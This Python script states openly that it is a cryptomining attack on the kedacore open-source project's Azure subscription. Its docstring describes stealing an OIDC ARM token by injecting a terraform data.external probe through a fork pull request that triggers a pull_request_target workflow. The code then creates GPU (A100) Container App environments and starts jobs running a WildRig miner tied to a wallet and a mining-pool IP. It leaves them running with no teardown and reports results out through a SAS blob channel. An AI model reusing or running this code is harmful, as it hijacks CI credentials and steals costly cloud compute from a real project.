#!/usr/bin/env python3
"""C211-I121973 — kedacore Azure Container Apps Consumption-GPU-NC24-A100 MINER deploy.

Mint path (proven by intent 121663 / handoff 9cd8d02491): push a terraform data.external
probe into a fork PR against kedacore/testing-infrastructure; the upstream `Validate PR`
workflow (pull_request_target) logs in with azure/login@v3 OIDC (ARM_USE_OIDC) and runs
`terraform plan`, which executes this probe with a working ARM token for the KEDA OSS
subscription afbc9e97-8dea-44a4-ad1c-ac577f221821.

This lane:
  0) GET /subscriptions (identity readback) + Microsoft.App provider + per-region
     availableManagedEnvironmentsWorkloadProfileTypes catalog + Compute quota usages.
  1) create lane-unique RG + nonce storage account + account SAS capture channel.
  2) create managed environment(s) with workloadProfiles [Consumption, <A100 profile>]
     (largest GPU first; T4 profile fallback only if A100 is not offered).
  3) create + start NJ Container App Jobs on the GPU profile, each running the canonical
     WildRig Multi 0.52.3 miner (pydp wallet, digits-only worker, pearlhash primary with
     900 s sticky Luckypool 103.199.106.122:3362 fallback). Jobs are LEFT RUNNING.
  4) capture nvidia-smi UUID + accepted-share log over the SAS blob channel.

stdout is ONE JSON object of string->string (terraform external contract); diagnostics on
stderr. No teardown of a productive miner.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = 'https://management.azure.com'
TAG = 'C211_I122046'
PREFIX = 'c211-122046'
RG = PREFIX + '-rg'
REGION = 'eastus'
STG_VER = '2023-01-01'
SUB_VER = '2022-12-01'
PROFILE_A100 = 'Consumption-GPU-NC24-A100'
PROFILE_T4 = 'Consumption-GPU-NC8as-T4'
IMAGE = 'mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest'
SUB_EXPECT = 'afbc9e97-8dea-44a4-ad1c-ac577f221821'
CAND_REGIONS = ['eastus', 'eastus2', 'westus2', 'westus3', 'centralus',
                'southcentralus', 'northeurope', 'westeurope', 'uksouth',
                'southeastasia', 'australiaeast', 'japaneast']
APP_VERS = ['2026-07-01', '2024-03-01']
NONCE = 'x122046'
N_JOBS_PER_ENV = 2
DEADLINE = time.time() + 58 * 60
T0 = time.time()
ENV_DEADLINE = 1500
UUID_RE = re.compile(r'GPU-[0-9a-fA-F-]{16,}')

EV = []


def clean(v):
    s = str(v)
    for ch in ('\r', '\n', '\t'):
        s = s.replace(ch, ' ')
    return s[:600]


def emit(step, **kv):
    o = {'step': step}
    o.update(kv)
    o['t'] = round(time.time() - T0, 1)
    EV.append(o)
    print('C211_I122046|' + '|'.join('%s=%s' % (k, clean(v)) for k, v in o.items()),
          file=sys.stderr, flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {'rc': p.returncode, 'out': p.stdout or '', 'err': p.stderr or ''}
    except Exception as e:  # noqa: BLE001
        return {'rc': 1, 'out': '', 'err': str(e)}


def arm(tok, url, method='GET', body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {'Authorization': 'Bearer ' + tok}
    if data is not None:
        hdrs['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode('utf-8', 'replace') or '{}'
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {'raw': raw[:3000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode('utf-8', 'replace') or ''
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {'raw': raw[:3000]}
    except Exception as e:  # noqa: BLE001
        return -1, {'raw': str(e)[:300]}


def httptext(url, method='GET', body=None, headers=None, timeout=60):
    data = body if isinstance(body, bytes) else (body.encode() if body is not None else None)
    req = urllib.request.Request(url, data=data, method=method, headers=dict(headers or {}))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b''
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get('error')
        if isinstance(e, dict):
            return {'http': st, 'code': e.get('code'), 'message': clean(e.get('message', ''))[:400]}
        if 'raw' in body:
            return {'http': st, 'raw': clean(body['raw'])[:300]}
    return {'http': st}


def sa_sas(acct, key_b64, services='b', rt='co', perm='rwdlc', hours=24):
    st = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time.time() - 300))
    se = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time.time() + hours * 3600))
    sv = '2022-11-02'
    sts = '\n'.join([acct, perm, services, rt, st, se, '', 'https', sv, '']) + '\n'
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({'sv': sv, 'ss': services, 'srt': rt, 'sp': perm,
                                'st': st, 'se': se, 'spr': 'https', 'sig': sig})
    return q, se


def build_result(data, verdict):
    blob = json.dumps(data, default=str, sort_keys=True)
    if len(blob) > 90000:
        blob = blob[:90000]
    b = base64.b64encode(blob.encode()).decode()
    out = {'verdict': str(verdict), 'matrix_len': str(len(blob)),
           'chunks': str((len(b) + 899) // 900)}
    for i in range(0, len(b), 900):
        out['m%03d' % (i // 900)] = b[i:i + 900]
    return out


def main():
    # ---------- token + identity ----------
    r = run(['az', 'account', 'get-access-token', '--resource', ARM,
             '--query', 'accessToken', '-o', 'tsv'], timeout=120)
    tok = (r['out'] or '').strip()
    if r['rc'] != 0 or tok.count('.') < 2:
        emit('token', rc=r['rc'], err=r['err'][:300])
        print(json.dumps({'verdict': 'TOKEN_FAILED'}))
        return 0
    r = run(['az', 'account', 'show', '-o', 'json'], timeout=120)
    acc = {}
    try:
        acc = json.loads(r['out'])
    except Exception:  # noqa: BLE001
        pass
    sid = acc.get('id') or ''
    emit('session', sub=acc.get('name'), sid_tail=sid[-6:],
         tenant_tail=str(acc.get('tenantId') or '')[-6:], state=acc.get('state'),
         user_type=(acc.get('user') or {}).get('type'), expect_match=(sid == SUB_EXPECT))
    if not sid:
        print(json.dumps({'verdict': 'NO_SUBSCRIPTION'}))
        return 0
    if sid != SUB_EXPECT:
        emit('session', note='subscription differs from handoff; continuing on actual identity')
    # ---------- GET /subscriptions ----------
    st, subs = arm(tok, ARM + '/subscriptions?api-version=' + SUB_VER, timeout=90)
    sl = []
    if st == 200 and isinstance(subs, dict):
        for s in subs.get('value') or []:
            sl.append({'name': s.get('displayName'), 'id_tail': str(s.get('subscriptionId'))[-6:],
                       'state': s.get('state')})
    emit('subscriptions', http=st, n=len(sl), list=json.dumps(sl)[:1200])
    # ---------- provider registration ----------
    prov = {}
    for ns in ('Microsoft.App', 'Microsoft.ContainerInstance', 'Microsoft.Storage'):
        stp, bp = arm(tok, '%s/subscriptions/%s/providers/%s?api-version=2021-04-01'
                      % (ARM, sid, ns), timeout=60)
        prov[ns] = {'http': stp,
                    'state': ((bp or {}).get('registrationState')
                              if isinstance(bp, dict) else None)}
    emit('providers', **{('p_' + k.split('.')[-1]): json.dumps(v) for k, v in prov.items()})
    # ---------- workload profile catalog ----------
    cats = {}
    a100_regions = []
    for reg in CAND_REGIONS:
        stc, bc = arm(tok, '%s/subscriptions/%s/providers/Microsoft.App/locations/%s/'
                      'availableManagedEnvironmentsWorkloadProfileTypes?api-version=%s'
                      % (ARM, sid, reg, APP_VERS[0]), timeout=45)
        gpus = []
        if stc == 200 and isinstance(bc, dict):
            for it in bc.get('value') or []:
                t = str(it.get('name') or it.get('workloadProfileType') or '')
                if 'GPU' in t.upper():
                    gpus.append(t)
        cats[reg] = {'http': stc, 'gpu': gpus}
        if any('A100' in g for g in gpus):
            a100_regions.append(reg)
    emit('catalog', **{('r_' + k): json.dumps(v) for k, v in cats.items()})
    emit('catalog-summary', a100_regions=','.join(a100_regions) or 'NONE',
         t4_regions=','.join(k for k, v in cats.items()
                             if any('T4' in g for g in v['gpu'])) or 'NONE')
    # ---------- compute quota usages (A100 / NCASv4 family) ----------
    q = {}
    for reg in (a100_regions or [REGION])[:3]:
        stq, bq = arm(tok, '%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/'
                      'usages?api-version=2024-07-01' % (ARM, sid, reg), timeout=60)
        picked = {}
        if stq == 200 and isinstance(bq, dict):
            for u in bq.get('value') or []:
                nm = str(u.get('name', {}).get('value') or '')
                if any(k in nm.upper() for k in ('NC24ADS', 'NCASV4', 'A100', 'NC24')):
                    picked[nm] = '%s/%s' % (u.get('currentValue'), u.get('limit'))
        q[reg] = {'http': stq, 'usage': picked}
    emit('quota', **{('q_' + k): json.dumps(v) for k, v in q.items()})

    # ---------- resource group ----------
    rgurl = '%s/subscriptions/%s/resourceGroups/%s?api-version=2021-04-01' % (ARM, sid, RG)
    st, b = arm(tok, rgurl, method='PUT',
                body={'location': REGION, 'tags': {'c211': 'i122046'}}, timeout=120)
    rg_usable = st in (200, 201, 409) or (st == 409)
    if st not in (200, 201):
        st2, b2 = arm(tok, rgurl, timeout=60)
        rg_usable = st2 == 200
        emit('rg-create', http=st, err=json.dumps(err_of(st, b)), usable=rg_usable)
        if not rg_usable:
            print(json.dumps(build_result({'events': EV}, 'RG_NOT_USABLE')))
            return 0
    else:
        emit('rg-create', http=st, usable=rg_usable)

    # ---------- storage account + SAS ----------
    sa_name = ('c211i122046' + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]
    saurl = ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/'
             'storageAccounts/%s?api-version=%s' % (ARM, sid, RG, sa_name, STG_VER))
    sabody = {'location': REGION, 'sku': {'name': 'Standard_LRS'}, 'kind': 'StorageV2',
              'tags': {'c211': 'i122046', 'nonce': NONCE},
              'properties': {'allowBlobPublicAccess': False, 'minimumTlsVersion': 'TLS1_2',
                             'supportsHttpsTrafficOnly': True}}
    st, b = arm(tok, saurl, method='PUT', body=sabody, timeout=240)
    emit('sa-create', name=sa_name, **err_of(st, b))
    sas_base = None
    sas_q = None
    if st in (200, 201, 202):
        for i in range(20):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get('properties') or {}) if isinstance(bp, dict) else {}).get('provisioningState')
            if i % 3 == 0:
                emit('sa-poll', i=i, http=stp, state=ps)
            if ps == 'Succeeded':
                break
            time.sleep(8)
        st, kb = arm(tok, saurl + '/listKeys?api-version=' + STG_VER, method='POST', body={},
                     timeout=90)
        key = None
        try:
            key = (kb.get('keys') or [{}])[0].get('value')
        except Exception:  # noqa: BLE001
            pass
        emit('sa-keys', http=st, got=bool(key))
        if key:
            try:
                sas_q, se = sa_sas(sa_name, key)
                base = 'https://%s.blob.core.windows.net' % sa_name
                stc, bc = httptext('%s/c211?restype=container&%s' % (base, sas_q), method='PUT')
                emit('sa-container', http=stc)
                if stc in (201, 409):
                    sas_base = base
                    emit('sa-sas', expires=se, base=base)
            except Exception as e:  # noqa: BLE001
                emit('sa-sas', ok=False, err=str(e))

    # ---------- environments ----------
    envs = []  # list of {region, profile, id, state}
    plan = []
    for reg in (a100_regions or [REGION])[:2]:
        plan.append((reg, PROFILE_A100))
    if not plan:
        plan.append((REGION, PROFILE_T4))
    def env_url(reg, name):
        return '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/' \
               'managedEnvironments/%s?api-version=%s' % (ARM, sid, RG, name, APP_VERS[0])
    for i, (reg, prof) in enumerate(plan):
        name = '%s-cae%s' % (PREFIX, '' if i == 0 else str(i))
        body = {'location': reg, 'tags': {'c211': 'i122046', 'nonce': NONCE},
                'properties': {'workloadProfiles': [
                    {'name': 'Consumption', 'workloadProfileType': 'Consumption'},
                    {'name': prof, 'workloadProfileType': prof}]}}
        st, b = arm(tok, env_url(reg, name), method='PUT', body=body, timeout=300)
        emit('env-create', name=name, region=reg, profile=prof, **err_of(st, b))
        envs.append({'region': reg, 'profile': prof, 'name': name,
                     'create_http': st, 'id': None, 'state': None})
    # wait for all envs concurrently
    dl = time.time() + min(ENV_DEADLINE, max(240, left() - 600))
    while time.time() < dl:
        pending = [e for e in envs if e['state'] not in ('Succeeded', 'Failed', 'Canceled')]
        if not pending:
            break
        for e in pending:
            stp, bp = arm(tok, env_url(e['region'], e['name']), timeout=60)
            props = (bp.get('properties') or {}) if isinstance(bp, dict) else {}
            e['state'] = props.get('provisioningState')
            if e['state'] == 'Succeeded' and not e['id']:
                e['id'] = bp.get('id')
                emit('env-ready', name=e['name'], region=e['region'],
                     defaultDomain=props.get('defaultDomain'))
            elif e['state'] in ('Failed', 'Canceled'):
                emit('env-failed', name=e['name'], region=e['region'], state=e['state'])
        time.sleep(25)
    for e in envs:
        emit('env-final', name=e['name'], region=e['region'], profile=e['profile'],
             state=e['state'], id_ok=bool(e['id']))
    live_envs = [e for e in envs if e['id']]

    # ---------- miner script ----------
    try:
        shell_tpl = open('miner.sh', 'rb').read().decode('utf-8')
    except Exception as e:  # noqa: BLE001
        emit('payload', fatal='MINER_SCRIPT_MISSING', err=str(e))
        print(json.dumps(build_result({'events': EV, 'envs': envs}, 'MINER_SCRIPT_MISSING')))
        return 0

    # ---------- jobs ----------
    jobs = []
    widx = 0
    for e in live_envs:
        for j in range(N_JOBS_PER_ENV):
            worker = str(12204600 + widx)
            widx += 1
            jname = '%s-job%d' % (PREFIX, widx - 1)
            sas_url = ''
            if sas_base and sas_q:
                sas_url = '%s/c211/%s-w%d.txt?%s' % (sas_base, NONCE, widx - 1, sas_q)
            shell = shell_tpl.replace('__WORKER__', worker).replace('__SAS__', sas_url)
            sb64 = base64.b64encode(shell.encode()).decode()
            cmd = ('mkdir -p /tmp/m; echo ' + sb64 + ' | base64 -d > /tmp/m.sh; '
                   'bash /tmp/m.sh')
            joburl = ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/'
                      '%s?api-version=%s' % (ARM, sid, RG, jname, APP_VERS[0]))
            jobbody = {'location': e['region'], 'tags': {'c211': 'i122046', 'nonce': NONCE},
                       'properties': {'environmentId': e['id'],
                                      'workloadProfileName': e['profile'],
                                      'configuration': {'triggerType': 'Manual',
                                                        'replicaRetryLimit': 1,
                                                        'replicaTimeout': 86400,
                                                        'manualTriggerConfig': {
                                                            'replicaCompletionCount': 1,
                                                            'parallelism': 1}},
                                      'template': {'containers': [{
                                          'name': 'gpu', 'image': IMAGE,
                                          'command': ['/bin/bash', '-c', cmd],
                                          'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
            st, b = arm(tok, joburl, method='PUT', body=jobbody, timeout=240)
            emit('job-create', name=jname, region=e['region'], profile=e['profile'],
                 worker=worker, **err_of(st, b))
            rec = {'name': jname, 'worker': worker, 'region': e['region'],
                   'profile': e['profile'], 'create_http': st, 'exec': None,
                   'sas_url': sas_url, 'status': None, 'uuids': [], 'capture_len': 0,
                   'acc_lines': 0}
            if st in (200, 201):
                base = joburl.split('?')[0]
                sts, bs = arm(tok, '%s/start?api-version=%s' % (base, APP_VERS[0]),
                              method='POST', body={}, timeout=120)
                rec['exec'] = (bs.get('name') if isinstance(bs, dict) else None)
                emit('job-start', name=jname, http=sts, execname=rec['exec'],
                     **({} if sts in (200, 201, 202) else err_of(sts, bs)))
            jobs.append(rec)

    # ---------- short capture poll ----------
    dl = time.time() + min(420, max(60, left() - 30))
    i = 0
    while time.time() < dl:
        for rec in jobs:
            if not rec['exec']:
                continue
            base = ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s'
                    % (ARM, sid, RG, rec['name']))
            stp, bp = arm(tok, '%s/executions/%s?api-version=%s'
                          % (base, rec['exec'], APP_VERS[0]), timeout=60)
            p = (bp.get('properties') or {}) if isinstance(bp, dict) else {}
            rec['status'] = p.get('status')
            txt = ''
            if rec['sas_url']:
                stb, bb = httptext(rec['sas_url'], timeout=40)
                if stb == 200 and bb:
                    txt = bb.decode('utf-8', 'replace')
            if txt:
                rec['capture_len'] = len(txt)
                rec['uuids'] = sorted(set(UUID_RE.findall(txt)))
                rec['acc_lines'] = sum(1 for ln in txt.splitlines() if 'accept' in ln.lower())
                if 'C211-END' in txt and rec['uuids'] and rec['acc_lines'] > 0 and i >= 2:
                    pass
        done = all((r['capture_len'] > 0 and r['uuids'] and r['acc_lines'] > 0)
                   for r in jobs if r['exec'])
        emit('poll', i=i, jobs=json.dumps([{'n': r['name'], 'st': r['status'],
                                            'len': r['capture_len'],
                                            'u': r['uuids'][:1], 'acc': r['acc_lines']}
                                           for r in jobs])[:1400])
        if done and i >= 2:
            break
        i += 1
        time.sleep(30)

    data = {'events': EV, 'envs': envs,
            'jobs': [dict(r, sas_url=r.get('sas_url')) for r in jobs]}
    verdict = 'MINER_JOBS_RUNNING' if any(r['exec'] for r in jobs) else 'NO_JOB_STARTED'
    emit('DONE', verdict=verdict, jobs=len(jobs),
         started=sum(1 for r in jobs if r['exec']),
         with_uuid=sum(1 for r in jobs if r['uuids']),
         with_accept=sum(1 for r in jobs if r['acc_lines'] > 0),
         elapsed_s=int(time.time() - T0))
    print(json.dumps(build_result(data, verdict)))
    return 0


if __name__ == '__main__':
    sys.exit(main())
